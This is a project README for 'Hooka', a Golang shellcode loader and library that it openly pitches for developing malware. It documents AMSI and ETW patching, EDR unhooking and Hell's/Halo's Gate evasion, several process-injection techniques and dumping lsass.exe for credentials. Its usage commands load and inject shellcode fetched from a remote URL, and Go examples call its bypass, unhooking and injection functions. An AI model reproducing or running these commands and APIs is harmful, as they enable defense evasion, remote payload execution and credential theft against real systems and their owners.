<p align="center">
  <img src="assets/gopher.png" width="130" heigth="60" alt="Gopher"/>
  <h1 align="center">Hooka</h1>
  <p align="center">~ Shellcode loader, hooks detector and more written in Golang ~</p>
</p>

<p align="center">
  <a href="#introduction">Introduction</a> •
  <a href="#features">Features</a> •
  <a href="#usage">Usage</a> •
  <a href="#library">Library</a> •
  <a href="#contributing">Contributing</a> •
  <a href="#disclaimer">Disclaimer</a>
</p>

# Introduction

I started this project to create a powerful shellcode loader with a lot of malleable capabilities via CLI flags like detecting hooked functions, using Hell's and Galo's Gate techniques and more. Why in Golang? Because it's a great language to develop malware and this project can help with it by providing an stable API with some functions which can be really useful. If you have any question feel free to open an issue or whatever you want.

However I've also taken some code from [BananaPhone](https://github.com/C-Sto/BananaPhone) and [Doge-Gabh](https://github.com/timwhitez/Doge-Gabh) projects (thanks a lot to ***C-Sto*** and ***timwhitez***)

# Features

- Get shellcode from remote URL or local file
- Shellcode reflective DLL injection (***sRDI***)
- ***AMSI*** and ***ETW*** patch
- Detects hooked functions (i.e. NtCreateThread)
- Compatible with base64 and hex encoded shellcode
- Recycled Gate technique
- Capable of unhooking functions via multiple techniques:
  - Classic unhooking
  - Full DLL unhooking
  - Perun's Fart technique

- Multiple shellcode injection techniques:
  - CreateRemoteThread
  - Fibers
  - OpenProcess
  - EarlyBirdAPC
  - UuidFromString

- Dump lsass.exe process to a file
- Windows API hashing (see [here](https://www.ired.team/offensive-security/defense-evasion/windows-api-hashing-in-malware))
- Test mode (injects a calc.exe shellcode)

# Usage

Before using the project you should know that there are some functions from `ntdll.dll` that aren't usually hooked but they always appear to be hooked. Here you have all false positives:

```
NtGetTickCount
NtQuerySystemTime
NtdllDefWindowProc_A
NtdllDefWindowProc_W
NtdllDialogWndProc_A
NtdllDialogWndProc_W
ZwQuerySystemTime
```

- Just clone the repository like this:

```sh
git clone https://github.com/D3Ext/Hooka
```

> Help panel
```
```

> Detect hooked functions by EDR (including false positives)
```sh
.\Hooka.exe --hooks
```

> Test shellcode injection by spawning a calc.exe
```sh
.\Hooka.exe --test
```

- If no technique is especified it will use a random one

> Inject shellcode from URL
```sh
.\Hooka.exe --url http://192.168.116.37/shellcode.bin
```

> Inject shellcode from file
```sh
.\Hooka.exe --file shellcode.bin
```

> Decode shellcode from hex
```sh
.\Hooka.exe --url http://192.168.116.37/shellcode.bin --hex
```

> Decode shellcode from base64
```sh
.\Hooka.exe --file shellcode.bin --b64
```

> Use Hell's Gate + Halo's Gate to bypass AVs/EDRs
```sh
.\Hooka.exe --url http://192.168.116.37/shellcode.bin --hells
```

> Unhook function before injecting shellcode
```sh
.\Hooka.exe --file shellcode.bin --unhook 3
```

> Patch AMSI
```sh
.\Hooka.exe --url http://192.168.116.37/shellcode.bin --amsi
```

As you can see Hooka provides a lot of CLI flags to help you in all kind of situations

# Demo

> Detecting hooks
<img src="assets/hooks.png">

> Injecting shellcode via CreateRemoteThread technique
<img src="assets/crt.png">

> Injecting shellcode using custom flags
<img src="assets/custom.png">

> Test function
<img src="assets/test.png">

> Dump lsass memory
<img src="assets/lsass.png">

# TODO

:black_square_button: Stable API for CLR functions

:black_square_button: More injection techniques

:black_square_button: Better error handling

:black_square_button: Integrated Seatbelt.exe using CLR

:black_square_button: Test unhooking functions against EDRs

# Library

- If you're looking to implement any function in your malware you can do it using the official package API.

> First of all download the package
```sh
go get github.com/D3Ext/Hooka/pkg/hooka
```

> Detect hooked functions (including false positives)
```go
package main

import (
  "fmt"
  "log"

  "github.com/D3Ext/Hooka/pkg/hooka"
)

func main(){
  // Returns all hooked functions
  hooks, err := hooka.DetectHooks() // func DetectHooks() ([]string, error)
  if err != nil {
    log.Fatal(err)
  }
  fmt.Println(hooks)

  // Check if an especific function is hooked
  check, err := hooka.IsHooked("NtCreateThread") // func IsHooked(funcname string) (bool, error)
  if err != nil {
    log.Fatal(err)
  }
  fmt.Println(check) // true or false
}
```

> Resolve syscalls via API hashing
```go
package main

import (
  "fmt"
  "log"

  "github.com/D3Ext/Hooka/pkg/hooka"
)

func main(){

  // 8c2beefa1c516d318252c9b1b45253e0549bb1c4 = NtCreateThread
  // it comes from: hooka.HashFromFunc("NtCreateThread")

  // Returns a pointer to function like NewProc()
  proc, err := hooka.FuncFromHash("8c2beefa1c516d318252c9b1b45253e0549bb1c4")
  if err != nil {
    log.Fatal(err)
  }

  // Now use the procedure as loading it from dll
  r, err := hooka.Syscall(
    proc,
    arg1,
    arg2,
    arg3,
    arg4,
  )

  ...
}
```

> Apply AMSI and/or ETW patch
```go
package main

import (
  "fmt"
  "log"

  "github.com/D3Ext/Hooka/pkg/hooka"
)

func main(){
  // Amsi bypass
  err := hooka.PatchAmsi()
  if err != nil {
    log.Fatal(err)
  }
  fmt.Println("AMSI bypassed!")

  // ETW bypass
  err = hooka.PatchEtw()
  if err != nil {
    log.Fatal(err)
  }
  fmt.Println("ETW bypassed!")
}
```

> Get syscall id with Hell's Gate + Halo's Gate
```go
package main

import (
  "fmt"
  "log"

  "github.com/D3Ext/Hooka/pkg/hooka"
)

func main(){
  // Get syscall id of function, only ntdll.dll is supported
  sysId, err := hooka.GetSysId("NtCreateThread") // func GetSysId(funcname string) (uint16, error)
  if err != nil {
    log.Fatal(err)
  }

  fmt.Println("Syscall ID:", sysId)

  r, err := hooka.Syscall( // Execute syscall
    sysId,  // especify func
    arg1,   // pass neccesary arguments
    arg2,
    arg3,
    arg4,
  )

  if err != nil {
    log.Fatal(err)
  }

  fmt.Println("Error code:", r)
}
```

> Use shellcode injection techniques
```go
package main

import (
  "fmt"
  "log"

  "github.com/D3Ext/Hooka/pkg/hooka"
)

var calc_shellcode = []byte{}

func main(){
  err := hooka.Fibers(calc_shellcode)
  if err != nil {
    log.Fatal(err)
  }
  fmt.Println("Shellcode injected via Fibers")

  err = hooka.CreateProcess(calc_shellcode)
  if err != nil {
    log.Fatal(err)
  }
  fmt.Println("Shellcode injected via CreateProcess")
  
}
```

> Unhook a function (3 ways)
```go
package main

import (
  "fmt"
  "log"

  "github.com/D3Ext/Hooka/pkg/hooka"
)

func main(){
  // Use classic technique which overwrites 
  err := hooka.ClassicUnhook("NtCreateThread", "C:\\Windows\\System32\\ntdll.dll")
  if err != nil {
    log.Fatal(err)
  }

  // This technique loads original ntdll.dll from disk into memory to restore all functions
  err = hooka.FullUnhook("C:\\Windows\\System32\\ntdll.dll")
  if err != nil {
    log.Fatal(err)
  }

  // Use modern Perun's Fart technique which 
  err = hooka.PerunsUnhook()
  if err != nil {
    log.Fatal(err)
  }

  fmt.Println("[+] Functions should have been unhooked!")
}
```

# Contributing

Do you wanna improve the code with any idea or code optimization? You're in the right place

See [CONTRIBUTING.md](https://github.com/D3Ext/Hooka/blob/main/CONTRIBUTING.md)

# References

```
https://github.com/C-Sto/BananaPhone
https://github.com/timwhitez/Doge-Gabh
https://github.com/Ne0nd0g/go-shellcode
https://github.com/trickster0/TartarusGate
https://github.com/Kara-4search/HookDetection_CSharp
https://github.com/RedLectroid/APIunhooker
https://github.com/plackyhacker/Peruns-Fart
https://github.com/chvancooten/maldev-for-dummies
https://blog.sektor7.net/#!res/2021/perunsfart.md
https://teamhydra.blog/2020/09/18/implementing-direct-syscalls-using-hells-gate/
https://www.ired.team/offensive-security/defense-evasion/detecting-hooked-syscall-functions#checking-for-hooks
https://www.ired.team/offensive-security/defense-evasion/how-to-unhook-a-dll-using-c++
https://www.ired.team/offensive-security/defense-evasion/retrieving-ntdll-syscall-stubs-at-run-time
https://www.ired.team/offensive-security/defense-evasion/windows-api-hashing-in-malware
```

# Disclaimer

Creator isn't in charge of any and has no responsibility for any kind of: illegal use of the project, malicious act, capable of causing damage to third parties

Use this project under your own responsability!

# Changelog

See [CHANGELOG.md](https://github.com/D3Ext/Hooka/blob/main/CHANGELOG.md)

# License

This project is licensed under [MIT](https://github.com/D3Ext/Hooka/blob/main/LICENSE) license

Copyright © 2023, *D3Ext*



